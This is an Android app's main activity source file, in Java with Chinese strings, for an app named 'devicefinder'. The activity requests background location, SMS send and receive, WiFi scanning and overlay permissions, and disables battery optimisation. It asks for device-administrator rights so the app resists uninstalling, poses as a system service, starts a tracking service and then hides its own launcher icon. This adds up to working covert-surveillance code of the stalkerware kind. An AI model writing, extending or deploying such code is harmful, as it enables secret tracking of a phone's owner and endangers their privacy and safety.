package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private boolean serviceStarted = false;
    private int permissionRetryCount = 0; // 【新增】防死循环重试计数

    // 步骤状态标志位
    private boolean waitingForBgLocSetting = false;
    private boolean waitingForBatterySetting = false;
    private boolean waitingForDeviceAdmin = false;
    private boolean waitingForOverlaySetting = false;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }
        checkAndRequestPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (waitingForDeviceAdmin) {
            waitingForDeviceAdmin = false;
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
                startTrackingServiceAndFinish();
            } else {
                Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
                startTrackingServiceAndFinish();
            }
            return;
        }

        if (waitingForOverlaySetting) {
            waitingForOverlaySetting = false;
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
            }
            checkDeviceAdmin(); 
            return;
        }

        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                checkOverlayPermission(); 
            } else {
                promptBatteryOptimizationAgain();
            }
            return;
        }

        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            proceedAfterBackgroundLocation();
            return;
        }

        checkAndRequestPermissions();
    }

    // ==================== 步骤一：系统权限申请 ====================

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                new AlertDialog.Builder(this)
                        .setTitle("必须允许精确闹钟")
                        .setMessage("为了让手机息屏后能准点上报定位，请在下一页面允许「闹钟和提醒」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        }).show();
                return;
            }
        }

        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
        // ★ [NEW] Android 13+ 的 WiFi 扫描权限，不申请则 DeviceInfoUtils.scanNearbyWifi 恒走降级分支
        boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
            if (permissionRetryCount >= 2) {
                // 如果重试超过 2 次，直接跳过，防止死循环
                proceedAfterPermissions();
                return;
            }
            permissionRetryCount++;

            // ★ [NEW] 用 List 组装，避免 SDK<33 时为了凑数加重复权限
            java.util.List<String> perms = new java.util.ArrayList<>();
            perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            perms.add(Manifest.permission.RECEIVE_SMS);
            perms.add(Manifest.permission.SEND_SMS);
            perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
            if (Build.VERSION.SDK_INT >= 33) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
                perms.add("android.permission.NEARBY_WIFI_DEVICES");
            }
            requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
        } else if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBgLocSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBgLocSetting = false;
                                proceedAfterBackgroundLocation();
                            }
                        }).show();
            } else {
                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_PERMISSIONS);
            }
        } else {
            proceedAfterPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            // 只要回调了，不马上重试，而是判断当前状态
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 成功给了一个，重置计数，继续查下一个
                permissionRetryCount = 0;
                checkAndRequestPermissions();
            } else {
                // 用户拒绝了，继续走流程（防止死循环）
                Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
                proceedAfterPermissions();
            }
        }
    }

    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) {
            checkOverlayPermission();
        } else {
            promptBatteryOptimization();
        }
    }

    private void proceedAfterBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_PERMISSIONS);
        } else {
            proceedAfterPermissions();
        }
    }

    // ==================== 步骤二：电池优化 ====================

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void promptBatteryOptimization() {
        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void promptBatteryOptimizationAgain() {
        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) startActivity(intent);
            else startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
        } catch (Exception e) {
            waitingForBatterySetting = false;
            checkOverlayPermission();
        }
    }

    // ==================== 步骤三：悬浮窗权限 ====================

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启悬浮窗权限")
                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                    .setCancelable(false)
                    .setPositiveButton("去开启", (dialog, which) -> {
                        waitingForOverlaySetting = true;
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()).show();
        } else {
            checkDeviceAdmin();
        }
    }

    // ==================== 步骤四：设备管理器（防卸载） ====================

    private void checkDeviceAdmin() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启防卸载保护")
                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                    .setCancelable(false)
                    .setPositiveButton("去激活", (dialog, which) -> {
                        waitingForDeviceAdmin = true;
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被轻易卸载");
                        try {
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForDeviceAdmin = false;
                            startTrackingServiceAndFinish();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启防卸载保护", Toast.LENGTH_LONG).show();
                        startTrackingServiceAndFinish();
                    }).show();
        } else {
            startTrackingServiceAndFinish();
        }
    }

    // ==================== 步骤五：启动服务 ====================

    private void startTrackingServiceAndFinish() {
        if (!serviceStarted) {
            serviceStarted = true;
            Intent intent = new Intent(this, TrackingService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
            else startService(intent);
            hideLauncherIcon();
        }
        finish(); 
    }

    private void hideLauncherIcon() {
        // 👇 加这行日志，看看有没有打印
        android.util.Log.d("HideIcon", "MainActivity 触发了隐藏图标调用");
        LauncherIconUtils.setLauncherIconVisible(this, false);
    }
}
